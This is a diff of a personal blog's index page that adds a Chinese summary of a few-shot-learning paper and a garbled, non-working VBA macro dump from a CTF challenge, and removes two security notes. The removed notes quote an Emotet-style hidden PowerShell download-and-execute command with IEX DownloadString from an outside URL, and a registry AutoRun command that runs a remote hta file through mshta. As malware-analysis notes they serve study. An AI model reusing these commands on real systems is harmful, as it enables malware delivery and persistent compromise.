@@ -156,6 +156,164 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/ML/Few-Shot20/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
+      <meta itemprop="name" content="Paul C">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Paul C's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/categories/ML/Few-Shot20/" class="post-title-link" itemprop="url">少于单样本的学习：从比类别数还小的样本集学习</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-11-17 16:13:22 / Modified: 17:17:59" itemprop="dateCreated datePublished" datetime="2023-11-17T16:13:22+08:00">2023-11-17</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ML/" itemprop="url" rel="index"><span itemprop="name">机器学习</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <blockquote>
+<p>Ilia Sucholutsky, Matthias Schonlau,‘Less Than One’-Shot Learning: Learning N Classes From M&lt;N Samples, In AAAI 2021 Proceedings .</p>
+</blockquote>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>本文提出了一种在LO背景下的数据集压缩和原型生成技术。</p>
+<p>借助软标签，k近邻分类器来生成软标签    </p>
+<h2 id="工作和发现"><a href="#工作和发现" class="headerlink" title="工作和发现"></a>工作和发现</h2><p>分析这些决策景观，得出使用 M &lt; N 软标签样本分离 N 个类别的理论下限，并研究所得系统的稳健性。</p>
+<p>1.分析创建的决策边界鲁棒性和稳定性的方法；</p>
+<p>2.软标签表征 训练集用于区分，比起硬标签使用的原型更少。理想情况，是O(N^2)降低到O(1)。</p>
+<h2 id="创新点"><a href="#创新点" class="headerlink" title="创新点"></a>创新点</h2><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><h3 id="一种有趣的提法"><a href="#一种有趣的提法" class="headerlink" title="一种有趣的提法"></a>一种有趣的提法</h3><p>通过描述，我们可以用犀牛 、马两类样本获得除犀牛、马以外 的独角兽的分类。</p>
+<p>FSL让模型更加样本有效。</p>
+<h2 id="分析的过去工作"><a href="#分析的过去工作" class="headerlink" title="分析的过去工作"></a>分析的过去工作</h2><h3 id="都在想办法对数据集进行蒸馏，"><a href="#都在想办法对数据集进行蒸馏，" class="headerlink" title="都在想办法对数据集进行蒸馏，"></a>都在想办法对数据集进行蒸馏，</h3><p>1.2019，软标签数据集蒸馏</p>
+<p>Sucholutsky, I.; and Schonlau, M. 2019. Soft-Label Dataset Distillation and Text Dataset Distillation. arXiv preprint arXiv:1910.02551 .</p>
+<p>2.2006，动态数据冻结</p>
+<p>Ruta, D. 2006. Dynamic data condensation for classification. In International Conference on Artificial Intelligence and Soft Computing, 672–681. Springer.</p>
+<h3 id="经典的小样本学习网络结构"><a href="#经典的小样本学习网络结构" class="headerlink" title="经典的小样本学习网络结构"></a>经典的小样本学习网络结构</h3><p>1.匹配网络2016：</p>
+<p>Vinyals, O.; Blundell, C.; Lillicrap, T.; Wierstra, D.; et al. 2016. Matching networks for one shot learning. In Advances in Neural Information Processing Systems, 3630–3638.</p>
+<p>2.原型网络，2017</p>
+<p>Snell, J.; Swersky, K.; and Zemel, R. 2017. Prototypical networks for few-shot learning. In Advances in Neural Information Processing Systems, 4077–4087.</p>
+<p>3.李飞飞，小样本识别</p>
+<p>Fei-Fei, L.; Fergus, R.; and Perona, P. 2006. One-shot learning of object categories. IEEE Transactions on Pattern Analysis and Machine Intelligence 28(4): 594–611.</p>
+<h3 id="其他内容"><a href="#其他内容" class="headerlink" title="其他内容"></a>其他内容</h3><p>0.1996，借助统计学习模型的主动学习</p>
+<p>Cohn, D. A.; Ghahramani, Z.; and Jordan, M. I. 1996. Active learning with statistical models. Journal of Artificial Intelligence Research 4: 129–145.</p>
+<p>1.2017，卷积神经网络的主动学习方法</p>
+<p>Sener, O.; and Savarese, S. 2017. Active learning for convolutional neural networks: A core-set approach. arXiv preprint arXiv:1708.00489 .</p>
+<p>2.2005，SVM在大数据集上的快速训练</p>
+<p>Tsang, I. W.; Kwok, J. T.; and Cheung, P.-M. 2005. Core vector machines: Fast SVM training on very large data sets. Journal of Machine Learning Research 6(Apr): 363–392.</p>
+<p>3.SVM的主动学习2001</p>
+<p>Tong, S.; and Koller, D. 2001. Support vector machine active learning with applications to text classification. Journal of Machine Learning Research 2(Nov): 45–66.</p>
+<p>4.2008，软标签上的分类对于标签噪声具有鲁棒性。</p>
+<p>Thiel, C. 2008. Classification on soft labels is robust against label noise. In International Conference on KnowledgeBased and Intelligent Information and Engineering Systems, 65–73. Springer.</p>
+<p>5.2014,KNN的随机邻居压缩</p>
+<p>Kusner, M.; Tyree, S.; Weinberger, K.; and Agrawal, K. 2014. Stochastic neighbor compression. In International Conference on Machine Learning, 622–630.</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/CTF/DASCTF02/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
+      <meta itemprop="name" content="Paul C">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Paul C's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/categories/CTF/DASCTF02/" class="post-title-link" itemprop="url">Untitled</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-10-21 17:53:29 / Modified: 18:01:17" itemprop="dateCreated datePublished" datetime="2023-10-21T17:53:29+08:00">2023-10-21</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">K1xME(<span class="number">6</span>p@<span class="number">08</span>ce%<span class="number">2</span>`XH,,`Fx`<span class="number">6</span>`@`B@@ @@<span class="number">8</span>`DNL ` ^<span class="number">8</span> @ @ @@`@H @<span class="number">0</span> @ <span class="number">0</span>@  @ @ ( @ @p X !` !h@@  `@@f$*\Rffff*<span class="number">046728</span>f59d*\R0*#f*\R0*#<span class="number">1</span>a*\R0*#<span class="number">12</span>,<span class="string">&quot;(xB(8@HP,Px0,B,XX@]].\&#x27;6\]K3|k] &#x27;@ 6enc @  ] @$D @$ &#x27;B&#x27; @V@ J B B J  &#x27;@ @ F @V@oP 6abc$~ 6abc @ +^s G+^) z+^8&#125;c+^s A+^o+^++^C+^ F B J$$N J$^$L&#x27;FContenAttribute VB_Name = &quot;</span>NewMacros<span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Sub XOREncryptFile() </span></span><br><span class="line"><span class="string">    Dim numbers(8) As Integer </span></span><br><span class="line"><span class="string">    For i = 0 To 8 </span></span><br><span class="line"><span class="string">        numbers(i) = (71 - (2 * 2 + 39) * (4 * 6 - 5) - 51) ^ (6 * 4 + 67) - 3 </span></span><br><span class="line"><span class="string">    Next i </span></span><br><span class="line"><span class="string">    CurrentDirectory = &quot;</span>.\<span class="string">&quot; </span></span><br><span class="line"><span class="string">    If (&quot;</span>&amp;<span class="string">&quot; &amp; &quot;</span>abc<span class="string">&quot; &amp; &quot;</span>:<span class="string">&quot; &amp; &quot;&quot;) Then </span></span><br><span class="line"><span class="string">        Exit </span></span><br><span class="line"><span class="string">    End If </span></span><br><span class="line"><span class="string">    IvfIN = &quot;</span>Free<span class="string">&quot; </span></span><br><span class="line"><span class="string">    Open &quot;</span>C:\ForBinaryAccessReadWrite<span class="string">&quot; As #1 </span></span><br><span class="line"><span class="string">    Get #1, , 8 </span></span><br><span class="line"><span class="string">    Close #1 </span></span><br><span class="line"><span class="string">    IIded2i = Len(numbers) </span></span><br><span class="line"><span class="string">    BY = Chr(Asc(Mid(numbers, i, 1)) Xor (i - Mod(8))) </span></span><br><span class="line"><span class="string">    Next i </span></span><br><span class="line"><span class="string">    If (0 &gt; (6 * 5)) Then </span></span><br><span class="line"><span class="string">        &#x27;Put your code here</span></span><br><span class="line"><span class="string">    End If </span></span><br><span class="line"><span class="string">End Sub</span></span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/CTF/xsb2023Py/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -833,152 +991,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/CTF/Shellcode03/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
-      <meta itemprop="name" content="Paul C">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Paul C's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/categories/CTF/Shellcode03/" class="post-title-link" itemprop="url">Powershell脚本</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2023-08-29 15:19:49 / Modified: 10:14:28" itemprop="dateCreated datePublished" datetime="2023-08-29T15:19:49+08:00">2023-08-29</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="Emptet下载器"><a href="#Emptet下载器" class="headerlink" title="Emptet下载器"></a>Emptet下载器</h2><p>技术特点：利用大小写，空格加base64绕过特征检测。</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd /c powErshEll -nop -w hiddEn -Ep bypass -Enc &#123;base64_encoded_string&#125;</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">I E X   ( N e w - O b j e c t   N e t . W e b c l i e n t ) . d o w n l o a d s t r i n g ( &quot; h t t p : / / e d u c a t i o l i n k . c o m / i n d e x . p h p &quot; ) </span><br></pre></td></tr></table></figure>
-<p> 基础知识：</p>
-<p> <code>-nop</code>：这是 <code>-NoProfile</code> 的简写，启动 PowerShell 时不加载用户的个人档案。 </p>
-<p> -w hiddEn 用于指定 PowerShell 窗口的显示样式。 </p>
-<p> <code>bypass</code> 设置表示没有任何限制：脚本可以运行，配置文件可以加载。 </p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/CTF/Windows02/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
-      <meta itemprop="name" content="Paul C">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Paul C's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/categories/CTF/Windows02/" class="post-title-link" itemprop="url">注册表项</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2023-08-29 14:19:49 / Modified: 11:14:08" itemprop="dateCreated datePublished" datetime="2023-08-29T14:19:49+08:00">2023-08-29</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>本文记录那些可以被用来权限维持以及信息探测的注册表项。</p>
-<h2 id="启动进程"><a href="#启动进程" class="headerlink" title="启动进程"></a>启动进程</h2><p><code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</code> </p>
-<p>用于指定那些只需要在下次系统启动时运行一次的程序或命令。与此位置相关的命令或程序在执行完一次后通常会从此列表中自动删除。 </p>
-<h2 id="下载并执行"><a href="#下载并执行" class="headerlink" title="下载并执行"></a>下载并执行</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg add &#x27;HKCU\Software\Microsoft\Command Processor&#x27; </span><br><span class="line">/v AutoRun /t REG_SZ /d &#x27;mshta.exe&#x27; http:/exam/1.hta /f</span><br></pre></td></tr></table></figure>
-<p> 通过注册表设置命令行默认启动项，当目标启动cmd时，便会下载并执行远程hta文件。 </p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1050,7 +1062,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">166</span>
+          <span class="site-state-item-count">168</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
